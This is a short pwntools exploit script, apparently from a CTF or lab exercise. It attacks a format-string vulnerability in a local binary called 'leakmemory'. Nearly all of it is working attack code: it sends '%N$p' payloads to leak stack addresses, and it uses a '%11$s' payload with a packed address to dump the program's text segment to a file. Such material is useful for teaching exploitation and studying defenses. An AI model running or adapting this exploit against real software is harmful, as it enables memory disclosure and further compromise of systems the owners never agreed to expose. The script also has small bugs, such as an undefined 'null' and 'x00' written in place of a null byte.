from pwn import *
import sys
context.log_level='info'

#p = remote('127.0.0.1',10001)
p = process("./leakmemory")

p.recv()
p.sendline('moxiaoxi')
p.recv()

def where_is_start(ret_index=null):
    return_addr=0
    for i in range(400):
        payload = '%%%d$p.TMP' % (i)
        p.sendline(payload)
        p.recvuntil('right:')
        val = p.recvuntil('.TMP')
        log.info(str(i*4)+' '+val.strip().ljust(10))
        if(i*4==ret_index):
            return_addr=int(val.strip('.TMP').ljust(10)[2:],16)
            return return_addr
        p.recvrepeat(0.2)

def dump_text(start_addr=0):
    text_segment=''
    try:
        while True:
            payload = 'Leak--->%11$s<-|'+p32(start_addr)
            p.sendline(payload)
            p.recvuntil('Leak--->')
            value = p.recvuntil('<-|').strip('<-|')
            text_segment += value
            start_addr += len(value)
            if(len(value)==0):
                text_segment += 'x00'
                start_addr += 1
            if(text_segment[-9:-1]=='x00'*8):
                break
    except Exception as e:
        print(e)
    finally:
        log.info('We get ' + str(len(text_segment)) +'byte file!')
        with open('blind_pwn_printf_demo_x32_dump','wb') as fout:
            fout.write(text_segment)

start_addr=where_is_start()
#dump_text(start_addr)